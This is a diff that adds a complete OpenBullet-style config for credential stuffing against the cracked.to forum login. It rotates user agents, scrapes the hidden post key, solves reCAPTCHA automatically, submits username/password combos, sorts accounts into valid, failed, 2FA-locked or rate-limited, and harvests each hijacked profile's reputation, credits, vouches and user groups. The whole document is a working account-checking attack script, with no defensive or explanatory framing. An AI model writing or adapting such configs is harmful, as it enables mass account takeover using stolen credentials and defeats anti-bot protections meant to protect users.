@@ -1,2 +1,75 @@
-test
-dd
+FUNCTION GetRandomUA -> VAR "UA" 
+
+REQUEST GET "https://cracked.to/member.php?action=login" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#bypass_wait_pg FUNCTION Delay "5000" 
+
+#POSTKEY PARSE "<SOURCE>" LR "<input name=\"my_post_key\" type=\"hidden\" value=\"" "\" />" -> VAR "POSTKEY" 
+
+RECAPTCHA "https://cracked.to/member.php?action=login" "6LemfFcUAAAAAGRkDd8m31QngNxrjj5LfoxlfdIJ" -> VAR "RECAP" 
+
+REQUEST POST "https://cracked.to/member.php?action=login" 
+  CONTENT "my_post_key=<POSTKEY>&username=<USER>&password=<PASS>&g-recaptcha-response=<RECAP>&action=do_login&url=https://cracked.to/" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#bypass_wait_pg FUNCTION Delay "5000" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+    KEY "If you have forgotten your password please" 
+  KEYCHAIN Success OR 
+    KEY "value=\"Log Out\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Our system has detected location change since your last visit. Type your Two Factor Authentication code in the box below to confirm it's you." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Please solve the reCAPTCHA to verify that you're not a robot." 
+    KEY "You have failed to login within the required number of attempts." 
+
+#usernamme PARSE "<SOURCE>" LR "class=\"drop-menu-username\">" "</a>" -> VAR "USERNAME" 
+
+REQUEST GET "https://cracked.to/<USERNAME>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#bypass_wait_pg FUNCTION Delay "5000" 
+
+#R PARSE "<SOURCE>" LR "<strong class=\"reputation_" "\">" -> VAR "R" 
+
+#Reputation PARSE "<SOURCE>" LR "<strong class=\"reputation_<R>\">" "</strong>" -> CAP "REPUTATION" 
+
+#L PARSE "<SOURCE>" LR "<span class=\"x-largetext\"><strong><span style=\"color: " ";\" " -> VAR "L" 
+
+#Likes PARSE "<SOURCE>" LR "<span class=\"x-largetext\"><strong><span style=\"color: <L>;\" class=\"x-largetext\">" "</span></strong></span>" -> CAP "Likes" 
+
+#T PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/search.php?action=finduserthreads&uid=" "\"" -> VAR "T" 
+
+#Threads PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/search.php?action=finduserthreads&uid=<T>\" class=\"x-largetext\">" "</a>" -> CAP "Threads" 
+
+#Posts PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/search.php?action=finduser&uid=<T>\" class=\"x-largetext\">" "</a>" -> CAP "Posts" 
+
+#Vouches PARSE "<SOURCE>" LR "<a href=\"/vouches.php?action=view&uid=<T>\" class=\"x-largetext\">" "</a>" -> CAP "Vouches" 
+
+#Credits PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/credits.php\" class=\"x-largetext\">" "</a>" CreateEmpty=FALSE -> CAP "Credits" 
+
+#UID PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/search.php?action=finduserthreads&uid=" "\"" -> CAP "UID" 
+
+#Refs PARSE "<SOURCE>" LR "Referrals: <span class=\"ml-auto\"><a href=\"referrals.php?uid=<T>\">" "</a></span>" -> CAP "Refs" 
+
+#Reported_Posts PARSE "<SOURCE>" LR "<a href=\"https://cracked.to/reports.php?uid=<T>\">" "</a>" -> CAP "Reported Posts" 
+
+#L PARSE "<SOURCE>" LR "<span class=\"normal_" "\">" -> VAR "L" 
+
+#Warning_Level PARSE "<SOURCE>" LR "<span class=\"normal_<L>\">" "</span>" CreateEmpty=FALSE -> CAP "Warning Level" 
+
+#UserGroups PARSE "<SOURCE>" LR ".png' alt='" "'" -> CAP "UserGroups" 
+
